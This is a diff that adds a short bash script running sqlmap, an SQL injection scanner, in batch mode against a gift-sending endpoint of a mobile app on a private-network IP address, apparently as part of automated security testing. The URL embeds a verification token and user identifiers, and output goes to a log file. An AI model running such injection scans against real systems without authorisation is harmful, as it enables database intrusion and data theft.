@@ -1,0 +1,2 @@
+#!/bin/bash
+python /Users/zhaichuang/Downloads/sqlmapTools/sqlmap.py -u "https://172.16.56.180/whistlenew/index.php?m=gift&a=sendGift&device_type=android&gift_id=31&city_id=10&school=weishao&words=des15&verify=102620%3Aweishao_android_5a0a93f40dd31_c81d4a5faa6b2f8c3abd0248c3521910&identity=teacher&recv_user_id=73584&package_name=com.ruijie.whistle&platform=android&app_version=5.8.1.15037&price=15&uid=0&aid=102620&msgTitle=%E7%A4%BC%E7%89%A9" --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/Client/Client_logfiles/162.log
